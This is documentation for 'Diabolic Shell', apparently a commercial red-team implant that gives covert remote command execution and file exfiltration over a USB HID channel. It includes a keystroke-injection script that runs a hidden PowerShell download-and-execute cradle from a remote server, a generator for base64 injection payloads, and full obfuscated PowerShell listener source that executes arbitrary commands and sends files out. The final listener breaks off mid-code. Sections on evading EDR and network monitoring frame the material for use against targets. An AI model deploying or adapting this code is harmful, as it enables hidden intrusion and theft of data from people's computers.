# Diabolic Shell

## What is Diabolic Shell?

Diabolic Shell is a covert, encrypted, bidirectional HID channel built into the Diabolic Parasite firmware (v2.0+). It establishes a hidden shell session on target systems, enabling real-time command execution and file exfiltration through a hardware-based USB HID channel.

### Key Capabilities

- **Hidden Shell Access:** Spawn and control a hidden shell session on the target
- **Real-Time Command Execution:** Send commands and receive output instantly via the Web UI
- **Covert File Exfiltration:** Extract files through the same HID channel — no network traffic generated
- **Encrypted Communication:** Optional AES-128-CBC encryption for command payloads with TRNG-generated keys
- **Adaptive Flow Control:** The Diabolic Parasite supports adaptive flow control through defined opcodes, allowing the device to signal the listener to adjust transmission speed to avoid heap runout or data corruption.

### Architecture Overview

```
┌─────────────────┐                    ┌─────────────────┐
│    Diabolic     │  ──── Input ────►  │    Listener     │
│    Parasite     │  ◄─── Output ────  │   (Target PC)   │
│                 │  ◄─── Feature ───  │                 │
└─────────────────┘                    └─────────────────┘
         │                                      
         │ WebSocket                            
         ▼                                      
┌─────────────────┐                             
│    Web UI       │                             
│   (Browser)     │                             
└─────────────────┘                             
```

---

## WebSocket & Browser Caching

### How File Exfiltration Works

When you exfiltrate files, data flows through this pipeline:

1. **Listener** reads file from target filesystem
2. **Listener** sends binary chunks via HID reports to the Parasite
3. **Parasite** buffers chunks and forwards them via WebSocket to your browser
4. **Browser** caches received chunks and assembles the complete file
5. **Download** is triggered once all chunks are received

### WebSocket Queue Limitations

The Parasite has limited memory (320KB SRAM total, much less available at runtime). During file transfers:

- Data arrives faster than WebSocket can transmit over WiFi
- Chunks queue up in memory waiting for transmission
- If the queue grows too large, the system runs out of memory

**This is why flow control exists** — to slow down the listener when the Parasite's buffers are filling up.

### Optimizing Transfer Performance

For best results during large file exfiltration:

| Factor | Recommendation |
|--------|----------------|
| **WiFi Signal** | Strong, stable connection to Parasite AP |
| **Range Extender** | Use Station Mode with a range extender for distant operations |
| **Browser** | Keep the Web UI tab active (background tabs may throttle WebSocket) |
| **File Size** | Larger files require more stable conditions |
| **Chunk Delays** | Increase `$BD` in listener if transfers fail frequently (transfers are very stable though!) |

---

## Covert by Design

Diabolic Shell operates through a hardware-based USB HID channel — the same type of channel that gaming mice use for DPI settings, RGB peripherals use for lighting control, and devices use for firmware updates. It's completely normal USB traffic that exists on virtually every modern peripheral connected to any computer.

### Designed to Evade Detection

**No network traffic.** Network monitoring sees nothing — all data travels over USB.

**Native shell execution.** Commands execute through standard Windows shell mechanisms, avoiding process injection or suspicious API patterns that trigger heuristic detection. Diabolic Shell is a transport layer — how you execute commands on the target is entirely up to you. Build your own listener with custom evasion techniques, alternative execution methods, or integrate with existing tooling.

**No file system anomalies.** Endpoint protection triggers nothing.

### Why EDR Doesn't Flag It

EDR solutions typically don't inspect the USB HID layer because doing so would generate alerts for every gaming mouse and RGB device in the environment. The signal-to-noise ratio makes it impractical to distinguish this traffic from legitimate peripheral communication.

Your commands and exfiltrated data move through a channel that most security tools are not designed to monitor.


## Delivery Methods

The listener must be deployed to the target system before Diabolic Shell can be used. The deployment method depends entirely on your reconnaissance and the target environment — **the examples below are provided as starting points, but the approach you choose is up to your skill as a red teamer.**

### Method 1: Remote Download & Execute (IEX)

For targets with internet access, use a simple download cradle that fetches and executes the listener from a remote server.

**Script Example:**
```
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -c "iex(iwr https://your-server.com/listener.txt -UseBasicParsing).Content"
ENTER
```

**Pros:**
- Minimal payload size
- Listener can be updated server-side
- Quick deployment

**Cons:**
- Requires internet access
- URL may be blocked or logged
- Depends on external infrastructure

---

### Method 2: Direct Injection (Air-Gapped / Offline)

For air-gapped systems or environments blocking external downloads, inject the entire listener directly via keystrokes. Use the included generator script to convert your listener to a payload script.

**Generator Script (`generate-script.ps1`):**
```powershell
<#
.SYNOPSIS
    Generates a script payload from a PowerShell listener script.

.DESCRIPTION
    This script takes a PowerShell listener script as input and generates
    a script file that will deploy the listener via Base64 encoding.
    The output file is saved as 'listener-script.txt' in the same folder.

.PARAMETER ListenerPath
    Path to the PowerShell listener script (.ps1 file)

.EXAMPLE
    .\generate-script.ps1 -ListenerPath ".\listener.ps1"
    
.EXAMPLE
    .\generate-script.ps1 .\listener.ps1

#>

param(
    [Parameter(Mandatory=$true, Position=0)]
    [string]$ListenerPath
)

# Validate input file exists
if (-not (Test-Path $ListenerPath)) {
    Write-Host "ERROR: File not found: $ListenerPath" -ForegroundColor Red
    exit 1
}

# Get full path and directory
$FullPath = (Resolve-Path $ListenerPath).Path
$Directory = Split-Path $FullPath -Parent
$OutputFile = Join-Path $Directory "listener-script.txt"

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  Script Generator" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Input:  $FullPath" -ForegroundColor Yellow
Write-Host "Output: $OutputFile" -ForegroundColor Yellow
Write-Host ""

# Read the listener script
Write-Host "Reading listener script..." -ForegroundColor Gray
$ScriptContent = Get-Content -Path $FullPath -Raw -Encoding UTF8

# Convert to UTF-16LE and Base64
Write-Host "Converting to Base64 (UTF-16LE)..." -ForegroundColor Gray
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($ScriptContent)
$Base64 = [Convert]::ToBase64String($Bytes)

Write-Host "Base64 length: $($Base64.Length) characters" -ForegroundColor Gray

# Chunk size for each STRING line
$ChunkSize = 500

# Build the script
Write-Host "Generating script..." -ForegroundColor Gray

$ScriptLines = [System.Collections.ArrayList]::new()

# Header
[void]$ScriptLines.Add("REM Diabolic Shell Listener Deployer (Base64)")
[void]$ScriptLines.Add("REM Deploys the listener via PowerShell variable")
[void]$ScriptLines.Add("")
[void]$ScriptLines.Add("DELAY 1000")
[void]$ScriptLines.Add("GUI r")
[void]$ScriptLines.Add("DELAY 1500")
[void]$ScriptLines.Add("STRING powershell -w hidden -nop -noni")
[void]$ScriptLines.Add("ENTER")
[void]$ScriptLines.Add("DELAY 2000")
[void]$ScriptLines.Add("")
[void]$ScriptLines.Add("REM Build Base64 string in variable `$q")
[void]$ScriptLines.Add('STRING $q=""')
[void]$ScriptLines.Add("ENTER")
[void]$ScriptLines.Add("DELAY 50")

# Split Base64 into chunks
$ChunkCount = 0
for ($i = 0; $i -lt $Base64.Length; $i += $ChunkSize) {
    $Chunk = $Base64.Substring($i, [Math]::Min($ChunkSize, $Base64.Length - $i))
    [void]$ScriptLines.Add("STRING `$q+=`"$Chunk`"")
    [void]$ScriptLines.Add("ENTER")
    [void]$ScriptLines.Add("DELAY 30")
    $ChunkCount++
}

# Footer - execute the decoded script
[void]$ScriptLines.Add("")
[void]$ScriptLines.Add("REM Execute the decoded script")
[void]$ScriptLines.Add('STRING iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($q)))')
[void]$ScriptLines.Add("ENTER")

# Write output file
$ScriptLines | Out-File -FilePath $OutputFile -Encoding ASCII

# Summary
Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "  Generation Complete!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "Output file: $OutputFile" -ForegroundColor White
Write-Host "Total lines: $($ScriptLines.Count)" -ForegroundColor White
Write-Host "Base64 chunks: $ChunkCount" -ForegroundColor White
Write-Host ""
Write-Host "Upload 'listener-script.txt' to your Diabolic Parasite" -ForegroundColor Yellow
Write-Host "and run it from the script editor." -ForegroundColor Yellow
```

**Usage:**
```powershell
.\generate-script.ps1 -ListenerPath ".\feature_report_interactive.ps1"
```

**Pros:**
- Works on air-gapped systems
- No network dependency
- Self-contained payload

**Cons:**
- Longer injection time (more keystrokes)
- Larger script file
- **No mouse movement allowed** — During injection, the user must not move the mouse or click, as this will shift focus away from the hidden PowerShell window and corrupt the keystroke stream

---

## HID Device Identification

Your listener must locate the Parasite by matching these identifiers:

| Parameter | Value | Description |
|-----------|-------|-------------|
| Vendor ID (VID) | `0x303A` | USB Vendor ID |
| Product ID (PID) | `0x0002` | USB Product ID |
| Usage Page | `0xFF00` | Vendor-defined HID usage page |
| Report ID | `6` | Report ID for all communications |

**Note:** VID/PID may vary depending on the HID device attached to your Parasite. These values should be configurable in your listener. The advanced listeners include a fallback matching mechanism that matches based on Usage Page, Usage, and Report Lengths when the exact VID/PID is not found — allowing the listener to work regardless of which device is cloned. If using a basic listener, you can implement similar logic or manually update the VID/PID values to match your configuration.


## Report Types

The Diabolic Parasite supports two methods for receiving data from the listener:

### Feature Reports (`HidD_SetFeature`)
- Polled by the device
- More compatible across systems
- Slightly higher latency
- Used for: text output, file data, flow control polling

### Output Reports (`HidD_SetOutputReport`)
- Interrupt-driven
- Lower latency, higher throughput
- Better for large file transfers
- Used for: file data chunks (recommended for exfiltration)

**Choose based on your target environment and performance requirements.**

---

## Binary Protocol Specification

All binary messages use a **magic byte prefix** (`0xD1`) to distinguish protocol data from regular text.

### Magic Byte
```
MAGIC = 0xD1
```
All opcodes must be preceded by this magic byte.


## Opcodes (Listener → Parasite)

### FILE_START (`0xAA`)
Initiates a file transfer.

```
┌───────┬────────┬───────────────┬──────────┬──────────────┐
│ MAGIC │ OPCODE │ FILE_SIZE     │ NAME_LEN │ FILENAME     │
│ 0xD1  │ 0xAA   │ 4 bytes (LE)  │ 1 byte   │ N bytes      │
└───────┴────────┴───────────────┴──────────┴──────────────┘
```

| Field | Size | Description |
|-------|------|-------------|
| MAGIC | 1 byte | `0xD1` |
| OPCODE | 1 byte | `0xAA` |
| FILE_SIZE | 4 bytes | Total file size in bytes (little-endian) |
| NAME_LEN | 1 byte | Length of filename (max 255) |
| FILENAME | N bytes | UTF-8 encoded filename |

---

### FILE_DATA (`0xBB`)
Sends a chunk of file data.

```
┌───────┬────────┬───────────────┬──────────────┐
│ MAGIC │ OPCODE │ CHUNK_SIZE    │ RAW_DATA     │
│ 0xD1  │ 0xBB   │ 2 bytes (LE)  │ N bytes      │
└───────┴────────┴───────────────┴──────────────┘
```

| Field | Size | Description |
|-------|------|-------------|
| MAGIC | 1 byte | `0xD1` |
| OPCODE | 1 byte | `0xBB` |
| CHUNK_SIZE | 2 bytes | Size of this chunk (little-endian) |
| RAW_DATA | N bytes | Raw binary file data |

---

### FILE_END (`0xCC`)
Signals completion of file transfer.

```
┌───────┬────────┐
│ MAGIC │ OPCODE │
│ 0xD1  │ 0xCC   │
└───────┴────────┘
```

---

### TEXT_OUTPUT (`0xDD`)
Sends command output text back to the Parasite.

```
┌───────┬────────┬──────────────┐
│ MAGIC │ OPCODE │ TEXT_DATA    │
│ 0xD1  │ 0xDD   │ N bytes      │
└───────┴────────┴──────────────┘
```

---

### ERROR (`0xEE`)
Sends an error message.

```
┌───────┬────────┬──────────┬───────────────┐
│ MAGIC │ OPCODE │ MSG_LEN  │ ERROR_MESSAGE │
│ 0xD1  │ 0xEE   │ 1 byte   │ N bytes       │
└───────┴────────┴──────────┴───────────────┘
```

| Field | Size | Description |
|-------|------|-------------|
| MAGIC | 1 byte | `0xD1` |
| OPCODE | 1 byte | `0xEE` |
| MSG_LEN | 1 byte | Length of error message (max 255) |
| ERROR_MESSAGE | N bytes | UTF-8 encoded error text |

---

## Flow Control Signals (Parasite → Listener)

The Parasite communicates flow control state via the **Feature Report buffer**. Your listener should periodically poll using `HidD_GetFeature` to check for these signals and adjust transmission speed accordingly.

### Signal Values

| Signal | Value | Action Required |
|--------|-------|-----------------|
| NORMAL | `0xFD` | Full speed - no delay needed |
| SLOW | `0xFE` | Slow down - add delay between chunks (configurable in listener) |
| SLOWER | `0xFC` | Slow down further - add longer delay between chunks (configurable in listener) |
| STOP | `0xFF` | Abort transfer immediately (already implemented in the provided listeners) |

**Note:** The actual delay values for SLOW and SLOWER are configurable in your listener. Adjust based on your target environment and WiFi conditions.

### Flow Control Response Format
```
┌───────┬──────────────┐
│ MAGIC │ SIGNAL       │
│ 0xD1  │ 0xFD/FE/FC/FF│
└───────┴──────────────┘
```

### When Signals Are Triggered

The Parasite monitors its internal WebSocket queue depth and available heap memory, and adjusts flow control dynamically:

| Condition | Signal Sent |
|-----------|-------------|
| WebSocket queue ≤ 5 | `NORMAL` (0xFD) |
| WebSocket queue > 5 | `SLOW` (0xFE) |
| WebSocket queue > 8 | `SLOWER` (0xFC) |
| Critical system state* | `STOP` (0xFF) |

*Critical states that trigger STOP:
- WebSocket queue > 11 combined with low heap memory (sustained for ~150ms)
- Heap memory continuously dropping without recovery
- USB task stack critically low
- User-initiated abort from Web UI

### When Signals Return to Normal

Flow control automatically returns to `NORMAL` when:
- WebSocket queue depth drops to ≤ 5
- System resources recover to safe levels

The Parasite continuously monitors conditions during file transfers and updates the signal in real-time. Your listener should poll regularly and respond to signal changes promptly.

**Recommended:** Poll for flow control signal periodically during file transfers (e.g., every 10-20 chunks). When `STOP` is received, immediately cease transmission and acknowledge.

---

## Command Protocol (Parasite → Listener)

Commands are sent from the Parasite to the listener via **Input Reports**. The listener reads these using `ReadFile` on the HID device handle.

### Command Framing
Commands are wrapped with start/end markers:

```
<<START:length>>command_text<<END>>
```

- `<<START:N>>` - Begins a command block (N = expected length)
- `<<END>>` - Ends the command block

Your listener should buffer incoming data between these markers.

---

## Built-in Commands

The reference listeners support these commands:

| Command | Description |
|---------|-------------|
| `DOWNLOAD <path>` | Exfiltrate file at specified path |
| `cmd` or `cmd.exe` | Spawn interactive cmd.exe session |
| `powershell` or `powershell.exe` | Spawn interactive PowerShell session |
| `exit` | Terminate interactive shell session |
| `<any other>` | Execute as shell command, return output |

**Environment variables** are expanded in file paths (e.g., `%USERPROFILE%`).

---

## Encryption (Optional)

Diabolic Shell supports AES-128-CBC encryption for command payloads.

| Parameter | Description |
|-----------|-------------|
| Algorithm | AES-128-CBC |
| Padding | PKCS7 |
| Key Length | 16 bytes (128 bits) |
| IV Length | 16 bytes |

### Key Generation

When you enable encryption on your Parasite, it automatically generates a **cryptographically secure random Key and IV** using the ESP32-S3's built-in True Random Number Generator (TRNG). You can:

- **Use the auto-generated keys** — Copy them from the Web UI to your listener
- **Generate new random keys** — Click "Generate Random" in the encryption settings
- **Set your own keys** — Enter custom Key/IV values manually

When encryption is enabled:
- Commands from Parasite are Base64-encoded ciphertext
- Listener decrypts before execution
- Configure matching Key/IV on both Parasite and listener

**⚠️ IMPORTANT:** Always ensure the Key and IV in your listener match the values configured on your Parasite. Mismatched keys will cause decryption failures.

---

## Listener Configuration Parameters

Reference listeners use these configurable parameters:

| Parameter | Default | Description |
|-----------|---------|-------------|
| `$VI` | `0x303A` | Vendor ID to match |
| `$PI` | `0x0002` | Product ID to match |
| `$UP` | `0xFF00` | Usage Page to match |
| `$RI` | `6` | Report ID |
| `$BC` | `512` | Bytes per chunk (file transfer) — **DO NOT CHANGE** |
| `$RD` | `1500` | Microseconds delay after Feature Report |
| `$RU` | `1000` | Microseconds delay after Output Report (output report listeners only) |
| `$BD` | `10` | Milliseconds delay between data chunks |
| `$MD` | `25-30` | Milliseconds delay after FILE_START/FILE_END |
| `$MG` | `0xD1` | Magic byte — **DO NOT CHANGE** |
| `$EN` | `$false` | Encryption enabled flag |
| `$KY` | (hex string) | AES key (32 hex chars = 16 bytes) |
| `$IV` | (hex string) | AES IV (32 hex chars = 16 bytes) |

**⚠️ IMPORTANT:** Do not modify `$MG` (magic byte). These value are hardcoded in the Parasite firmware and changing them will break protocol compatibility.

---

## Provided Listener Variants

### Basic Feature Report Listener (`basic_feature.ps1`)

Uses Feature Reports for all communication. Simple command execution and file download.

```powershell
$VI=0x303a;$PI=0x0002;$UP=0xFF00;$RI=6;$KY="172C6371FEDFD66DC2F9B89F01779D55";$IV="A4D4BA68394CB046DB232032430E58F4";$EN=$false;$BC=512;$RD=1500;$BD=10;$MD=25;$MG=0xD1
Add-Type 'using System;using System.Runtime.InteropServices;using Microsoft.Win32.SafeHandles;using System.Diagnostics;public class H{[DllImport("kernel32.dll")]public static extern bool ReadFile(SafeFileHandle h,byte[]b,uint n,out uint r,IntPtr o);[DllImport("setupapi.dll")]public static extern IntPtr SetupDiGetClassDevs(ref Guid g,IntPtr e,IntPtr p,uint f);[DllImport("setupapi.dll")]public static extern bool SetupDiEnumDeviceInterfaces(IntPtr i,IntPtr d,ref Guid g,uint m,ref DI r);[DllImport("setupapi.dll",CharSet=CharSet.Auto)]public static extern bool SetupDiGetDeviceInterfaceDetail(IntPtr i,ref DI d,IntPtr t,uint s,out uint r,IntPtr x);[DllImport("setupapi.dll")]public static extern bool SetupDiDestroyDeviceInfoList(IntPtr i);[DllImport("hid.dll")]public static extern void HidD_GetHidGuid(out Guid g);[DllImport("hid.dll")]public static extern bool HidD_GetAttributes(SafeFileHandle h,ref A a);[DllImport("hid.dll")]public static extern bool HidD_GetPreparsedData(SafeFileHandle h,out IntPtr p);[DllImport("hid.dll")]public static extern bool HidD_FreePreparsedData(IntPtr p);[DllImport("hid.dll")]public static extern int HidP_GetCaps(IntPtr p,out C c);[DllImport("hid.dll")]public static extern bool HidD_SetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("hid.dll")]public static extern bool HidD_GetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("kernel32.dll",CharSet=CharSet.Auto)]public static extern SafeFileHandle CreateFile(string f,int a,uint s,IntPtr c,uint m,uint l,IntPtr t);[StructLayout(LayoutKind.Sequential)]public struct DI{public uint cb;public Guid g;public uint f;public IntPtr r;}[StructLayout(LayoutKind.Sequential)]public struct A{public uint s;public ushort v,p,n;}[StructLayout(LayoutKind.Sequential)]public struct C{public ushort u,up,il,ol,fl;[MarshalAs(UnmanagedType.ByValArray,SizeConst=17)]public ushort[]r;public ushort n1,n2,n3,n4,n5,n6,n7,n8,n9,n10;}public static int Z(object o){return Marshal.SizeOf(o);}public static void U(int us){long t=Stopwatch.GetTimestamp()+us*(Stopwatch.Frequency/1000000);while(Stopwatch.GetTimestamp()<t);}}'
function G{$g=[Guid]::Empty;[H]::HidD_GetHidGuid([ref]$g);$s=[H]::SetupDiGetClassDevs([ref]$g,0,0,18);if(!$s){return}$n=0;$di=New-Object H+DI;$di.cb=[H]::Z($di);while([H]::SetupDiEnumDeviceInterfaces($s,0,[ref]$g,$n++,[ref]$di)){$r=0;[H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,0,0,[ref]$r,0)>$x;$b=[Runtime.InteropServices.Marshal]::AllocHGlobal($r);[Runtime.InteropServices.Marshal]::WriteInt32($b,$(if([IntPtr]::Size-eq8){8}else{5}));if([H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,$b,$r,[ref]$r,0)){$h=[H]::CreateFile([Runtime.InteropServices.Marshal]::PtrToStringAuto([IntPtr]::Add($b,4)),-1073741824,3,0,3,0,0);if(!$h.IsInvalid){$a=New-Object H+A;$a.s=[H]::Z($a);if([H]::HidD_GetAttributes($h,[ref]$a)-and$a.v-eq$VI-and$a.p-eq$PI){$p=0;if([H]::HidD_GetPreparsedData($h,[ref]$p)){$c=New-Object H+C;[H]::HidP_GetCaps($p,[ref]$c)>$x;[H]::HidD_FreePreparsedData($p)>$x;if(!$UP-or$c.up-eq$UP){[Runtime.InteropServices.Marshal]::FreeHGlobal($b);[H]::SetupDiDestroyDeviceInfoList($s)>$x;return @{H=$h;I=$c.il;F=$c.fl;P=$c.fl-1}}}}$h.Close()}}[Runtime.InteropServices.Marshal]::FreeHGlobal($b)}[H]::SetupDiDestroyDeviceInfoList($s)>$x}function SR($D,[byte[]]$A){for($i=0;$i-lt$A.Length;$i+=$D.P){$z=[Math]::Min($D.P,$A.Length-$i);$p=[byte[]]::new($D.F);$p[0]=$RI;[Array]::Copy($A,$i,$p,1,$z);[H]::HidD_SetFeature($D.H,$p,$p.Length)>$x;[H]::U($RD)}}function W($D,$T){SR $D ([Text.Encoding]::ASCII.GetBytes("$T`n"))}function SE($D,$M){$b=[Text.Encoding]::UTF8.GetBytes($M);$l=[Math]::Min($b.Length,255);$f=[byte[]]::new(3+$l);$f[0]=$MG;$f[1]=0xEE;$f[2]=$l;[Array]::Copy($b,0,$f,3,$l);SR $D $f}function CS($D){$sb=[byte[]]::new($D.F);$sb[0]=$RI;try{if([H]::HidD_GetFeature($D.H,$sb,$sb.Length)){if($sb[1]-eq$MG-and$sb[2]-eq0xFF){return $true}}}catch{};return $false}function F($D,$P){$P=[Environment]::ExpandEnvironmentVariables($P);if(!(Test-Path $P)){SE $D "Not found";return}if((gi $P).PSIsContainer){SE $D "Is directory";return}try{$fb=[IO.File]::ReadAllBytes($P)}catch{SE $D "Read error";return}if($fb.Length-gt10MB){SE $D "Too large";return}$fn=[IO.Path]::GetFileName($P);$fs=$fb.Length;$nb=[Text.Encoding]::UTF8.GetBytes($fn);$nl=[Math]::Min($nb.Length,255);$sf=[byte[]]::new(7+$nl);$sf[0]=$MG;$sf[1]=0xAA;$sf[2]=$fs-band 0xFF;$sf[3]=($fs-shr 8)-band 0xFF;$sf[4]=($fs-shr 16)-band 0xFF;$sf[5]=($fs-shr 24)-band 0xFF;$sf[6]=$nl;[Array]::Copy($nb,0,$sf,7,$nl);SR $D $sf;Sleep -M $MD;$cn=0;for($i=0;$i-lt$fs;$i+=$BC){if(($cn%50-eq0)-and(CS $D)){W $D "STOPPED";return};$cn++;$cs=[Math]::Min($BC,$fs-$i);$df=[byte[]]::new(4+$cs);$df[0]=$MG;$df[1]=0xBB;$df[2]=$cs-band 0xFF;$df[3]=($cs-shr 8)-band 0xFF;[Array]::Copy($fb,$i,$df,4,$cs);SR $D $df;Sleep -M $BD};Sleep -M $MD;SR $D ([byte[]]@($MG,0xCC))}function Y($z){$a=[Security.Cryptography.Aes]::Create();$a.Mode='CBC';$a.Padding='PKCS7';$k=[byte[]]::new(16);$v=[byte[]]::new(16);for($i=0;$i-lt16;$i++){$k[$i]=[Convert]::ToByte($KY.Substring($i*2,2),16);$v[$i]=[Convert]::ToByte($IV.Substring($i*2,2),16)}$a.Key=$k;$a.IV=$v;return(New-Object IO.StreamReader([Security.Cryptography.CryptoStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String($z)),$a.CreateDecryptor(),'Read'))).ReadToEnd()}
$d=G;if(!$d){exit}W $d "Ready";$bf="";$rx=0;while(1){$b=[byte[]]::new($d.I);$r=0;if([H]::ReadFile($d.H,$b,$b.Length,[ref]$r,0)-and$r-gt0){$s=[Text.Encoding]::ASCII.GetString($b,1,$b.Length-1).TrimEnd([char]0);if($s){if($s-match'<<START:\d+>>'){$bf="";$rx=1;$s=$s-replace'<<START:\d+>>'}if($s-match'<<END>>'){$s=$s-replace'<<END>>';$bf+=$s;$rx=0;$t=$bf.Trim();if($t){$c=if($EN){try{Y $t}catch{W $d "ERR";$bf="";continue}}else{$t};if($c){$c=$c.Trim();if($c-match'^DOWNLOAD\s+(.+)$'){F $d $Matches[1].Trim()}else{try{$o=(iex $c 2>&1|Out-String).Trim()}catch{$o="ERR:$_"};W $d $(if($o){$o}else{"OK"})}}$bf=""}}elseif($rx){$bf+=$s}}}Sleep -M 5}
```

---

### Basic Output Report Listener (`basic_output.ps1`)

Uses Output Reports for file data (higher throughput). Same command execution as basic_feature.

```powershell
$VI=0x303a;$PI=0x0002;$UP=0xFF00;$RI=6;$KY="172C6371FEDFD66DC2F9B89F01779D55";$IV="A4D4BA68394CB046DB232032430E58F4";$EN=$false;$BC=512;$RD=1500;$BD=10;$MD=25;$MG=0xD1;$RU=1000
Add-Type 'using System;using System.Runtime.InteropServices;using Microsoft.Win32.SafeHandles;using System.Diagnostics;public class H{[DllImport("kernel32.dll")]public static extern bool ReadFile(SafeFileHandle h,byte[]b,uint n,out uint r,IntPtr o);[DllImport("setupapi.dll")]public static extern IntPtr SetupDiGetClassDevs(ref Guid g,IntPtr e,IntPtr p,uint f);[DllImport("setupapi.dll")]public static extern bool SetupDiEnumDeviceInterfaces(IntPtr i,IntPtr d,ref Guid g,uint m,ref DI r);[DllImport("setupapi.dll",CharSet=CharSet.Auto)]public static extern bool SetupDiGetDeviceInterfaceDetail(IntPtr i,ref DI d,IntPtr t,uint s,out uint r,IntPtr x);[DllImport("setupapi.dll")]public static extern bool SetupDiDestroyDeviceInfoList(IntPtr i);[DllImport("hid.dll")]public static extern void HidD_GetHidGuid(out Guid g);[DllImport("hid.dll")]public static extern bool HidD_GetAttributes(SafeFileHandle h,ref A a);[DllImport("hid.dll")]public static extern bool HidD_GetPreparsedData(SafeFileHandle h,out IntPtr p);[DllImport("hid.dll")]public static extern bool HidD_FreePreparsedData(IntPtr p);[DllImport("hid.dll")]public static extern int HidP_GetCaps(IntPtr p,out C c);[DllImport("hid.dll")]public static extern bool HidD_SetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("hid.dll")]public static extern bool HidD_GetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("hid.dll")]public static extern bool HidD_SetOutputReport(SafeFileHandle h,byte[]b,uint l);[DllImport("kernel32.dll",CharSet=CharSet.Auto)]public static extern SafeFileHandle CreateFile(string f,int a,uint s,IntPtr c,uint m,uint l,IntPtr t);[StructLayout(LayoutKind.Sequential)]public struct DI{public uint cb;public Guid g;public uint f;public IntPtr r;}[StructLayout(LayoutKind.Sequential)]public struct A{public uint s;public ushort v,p,n;}[StructLayout(LayoutKind.Sequential)]public struct C{public ushort u,up,il,ol,fl;[MarshalAs(UnmanagedType.ByValArray,SizeConst=17)]public ushort[]r;public ushort n1,n2,n3,n4,n5,n6,n7,n8,n9,n10;}public static int Z(object o){return Marshal.SizeOf(o);}public static void U(int us){long t=Stopwatch.GetTimestamp()+us*(Stopwatch.Frequency/1000000);while(Stopwatch.GetTimestamp()<t);}}'
function G{$g=[Guid]::Empty;[H]::HidD_GetHidGuid([ref]$g);$s=[H]::SetupDiGetClassDevs([ref]$g,0,0,18);if(!$s){return}$n=0;$di=New-Object H+DI;$di.cb=[H]::Z($di);while([H]::SetupDiEnumDeviceInterfaces($s,0,[ref]$g,$n++,[ref]$di)){$r=0;[H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,0,0,[ref]$r,0)>$x;$b=[Runtime.InteropServices.Marshal]::AllocHGlobal($r);[Runtime.InteropServices.Marshal]::WriteInt32($b,$(if([IntPtr]::Size-eq8){8}else{5}));if([H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,$b,$r,[ref]$r,0)){$h=[H]::CreateFile([Runtime.InteropServices.Marshal]::PtrToStringAuto([IntPtr]::Add($b,4)),-1073741824,3,0,3,0,0);if(!$h.IsInvalid){$a=New-Object H+A;$a.s=[H]::Z($a);if([H]::HidD_GetAttributes($h,[ref]$a)-and$a.v-eq$VI-and$a.p-eq$PI){$p=0;if([H]::HidD_GetPreparsedData($h,[ref]$p)){$c=New-Object H+C;[H]::HidP_GetCaps($p,[ref]$c)>$x;[H]::HidD_FreePreparsedData($p)>$x;if(!$UP-or$c.up-eq$UP){[Runtime.InteropServices.Marshal]::FreeHGlobal($b);[H]::SetupDiDestroyDeviceInfoList($s)>$x;return @{H=$h;I=$c.il;O=$c.ol;F=$c.fl;P=$c.fl-1}}}}$h.Close()}}[Runtime.InteropServices.Marshal]::FreeHGlobal($b)}[H]::SetupDiDestroyDeviceInfoList($s)>$x}function SR($D,[byte[]]$A){for($i=0;$i-lt$A.Length;$i+=$D.P){$z=[Math]::Min($D.P,$A.Length-$i);$p=[byte[]]::new($D.F);$p[0]=$RI;[Array]::Copy($A,$i,$p,1,$z);[H]::HidD_SetFeature($D.H,$p,$p.Length)>$x;[H]::U($RD)}}function SO($D,[byte[]]$A){for($i=0;$i-lt$A.Length;$i+=($D.O-1)){$z=[Math]::Min($D.O-1,$A.Length-$i);$p=[byte[]]::new($D.O);$p[0]=$RI;[Array]::Copy($A,$i,$p,1,$z);[H]::HidD_SetOutputReport($D.H,$p,$p.Length)>$x;[H]::U($RU)}}function W($D,$T){SR $D ([Text.Encoding]::ASCII.GetBytes("$T`n"))}function SE($D,$M){$b=[Text.Encoding]::UTF8.GetBytes($M);$l=[Math]::Min($b.Length,255);$f=[byte[]]::new(3+$l);$f[0]=$MG;$f[1]=0xEE;$f[2]=$l;[Array]::Copy($b,0,$f,3,$l);SR $D $f}function CS($D){$sb=[byte[]]::new($D.F);$sb[0]=$RI;try{if([H]::HidD_GetFeature($D.H,$sb,$sb.Length)){if($sb[1]-eq$MG-and$sb[2]-eq0xFF){return $true}}}catch{};return $false}function F($D,$P){$P=[Environment]::ExpandEnvironmentVariables($P);if(!(Test-Path $P)){SE $D "Not found";return}if((gi $P).PSIsContainer){SE $D "Is directory";return}try{$fb=[IO.File]::ReadAllBytes($P)}catch{SE $D "Read error";return}if($fb.Length-gt10MB){SE $D "Too large";return}$fn=[IO.Path]::GetFileName($P);$fs=$fb.Length;$nb=[Text.Encoding]::UTF8.GetBytes($fn);$nl=[Math]::Min($nb.Length,255);$sf=[byte[]]::new(7+$nl);$sf[0]=$MG;$sf[1]=0xAA;$sf[2]=$fs-band 0xFF;$sf[3]=($fs-shr 8)-band 0xFF;$sf[4]=($fs-shr 16)-band 0xFF;$sf[5]=($fs-shr 24)-band 0xFF;$sf[6]=$nl;[Array]::Copy($nb,0,$sf,7,$nl);SO $D $sf;Sleep -M $MD;$cn=0;for($i=0;$i-lt$fs;$i+=$BC){if(($cn%50-eq0)-and(CS $D)){W $D "STOPPED";return};$cn++;$cs=[Math]::Min($BC,$fs-$i);$df=[byte[]]::new(4+$cs);$df[0]=$MG;$df[1]=0xBB;$df[2]=$cs-band 0xFF;$df[3]=($cs-shr 8)-band 0xFF;[Array]::Copy($fb,$i,$df,4,$cs);SO $D $df;Sleep -M $BD};Sleep -M $MD;SO $D ([byte[]]@($MG,0xCC))}function 